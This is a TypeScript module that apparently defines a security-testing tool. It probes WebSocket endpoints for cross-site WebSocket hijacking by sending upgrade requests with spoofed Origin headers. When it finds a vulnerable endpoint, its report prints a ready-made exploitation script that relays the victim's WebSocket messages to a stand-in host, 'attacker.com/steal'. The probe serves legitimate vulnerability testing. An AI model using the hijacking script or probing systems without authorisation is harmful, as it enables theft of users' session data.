// T56 — cswsh_probe
// Cross-Site WebSocket Hijacking: tests whether WebSocket upgrade
// enforces Origin validation and token authentication.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'cswsh_probe',
  description:
    'Cross-Site WebSocket Hijacking (CSWSH) probe. Tests whether WebSocket connections ' +
    'enforce Origin header validation and require authentication at handshake. ' +
    'A vulnerable WebSocket allows any origin to connect and read sensitive data ' +
    'from the user\'s session. Impacts real-time data feeds, chat, trading platforms.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'ws_url',           type: 'string', required: true,  description: 'WebSocket URL (ws:// or wss://)' },
    { name: 'origin_whitelist',  type: 'string', required: false, description: 'JSON array of origins the server should allow (for validation)', default: '[]' },
    { name: 'auth_cookie',       type: 'string', required: false, description: 'Auth cookie to test session-bound access' },
    { name: 'timeout_ms',        type: 'number', required: false, description: 'Per-test timeout ms', default: 10000 },
  ],
};

// Test origins to use for CSWSH probes
const ATTACK_ORIGINS = [
  'https://evil.genesis-test.internal',
  'null',
  'http://localhost',
  'https://attacker.com',
];

export const cswshProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const wsUrl = String(params.ws_url || '');
    const authCookie = params.auth_cookie ? String(params.auth_cookie) : undefined;
    const timeoutMs = Number(params.timeout_ms || 10000);

    if (!wsUrl) return { output: 'ws_url required', parsed: { error: 'missing_ws_url' } };
    if (!wsUrl.startsWith('ws://') && !wsUrl.startsWith('wss://')) {
      return { output: 'ws_url must start with ws:// or wss://', parsed: { error: 'bad_protocol' } };
    }

    // Build an HTTP upgrade request manually to test origin validation
    // (WebSocket upgrade is a plain HTTP/1.1 request with Upgrade header)
    const httpUrl = wsUrl.replace(/^wss?:\/\//, (m) => m.startsWith('wss') ? 'https://' : 'http://');

    const results: Array<{ origin: string; upgrade_status: number; accepted: boolean; note: string; error?: string }> = [];

    for (const origin of ATTACK_ORIGINS) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const hdrs: Record<string, string> = {
          'Upgrade': 'websocket',
          'Connection': 'Upgrade',
          'Sec-WebSocket-Version': '13',
          'Sec-WebSocket-Key': Buffer.from(Math.random().toString()).toString('base64').slice(0, 24),
          'Origin': origin,
          'User-Agent': 'Mozilla/5.0 GENESIS/4.0',
        };
        if (authCookie) hdrs['Cookie'] = authCookie;

        const resp = await fetch(httpUrl, { headers: hdrs, signal: controller.signal });
        clearTimeout(timer);
        // 101 = Switching Protocols (WebSocket accepted)
        const accepted = resp.status === 101 || resp.status === 200;
        results.push({ origin, upgrade_status: resp.status, accepted, note: accepted ? 'WebSocket upgrade accepted from foreign origin!' : 'Origin rejected or not a WS endpoint' });
      } catch (err) {
        results.push({ origin, upgrade_status: 0, accepted: false, note: String(err), error: String(err) });
      }
    }

    const vulnerable = results.filter(r => r.accepted);
    const lines = [
      `cswsh_probe — Cross-Site WebSocket Hijacking test`,
      `Target: ${wsUrl}`,
      `Vulnerable (foreign origin accepted): ${vulnerable.length > 0 ? '⚡ YES — ' + vulnerable.length + ' origins accepted' : 'Not detected'}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.accepted ? '⚡ VULNERABLE' : (r.error ? '✗ ERR      ' : '  ·        ');
      lines.push(`  ${flag}  origin="${r.origin.padEnd(40)}"  status=${r.upgrade_status}`);
    }

    if (vulnerable.length > 0) {
      lines.push('');
      lines.push('EXPLOITATION: A CSWSH attack can be mounted by embedding:');
      lines.push(`  <script>`);
      lines.push(`    const ws = new WebSocket('${wsUrl}');`);
      lines.push(`    ws.onmessage = e => fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));`);
      lines.push(`  </script>`);
      lines.push('  in any page the victim visits — it will connect with their session cookies.');
    }

    return {
      output: lines.join('\n'),
      parsed: { vulnerable_count: vulnerable.length, vulnerable, results },
    };
  },
};
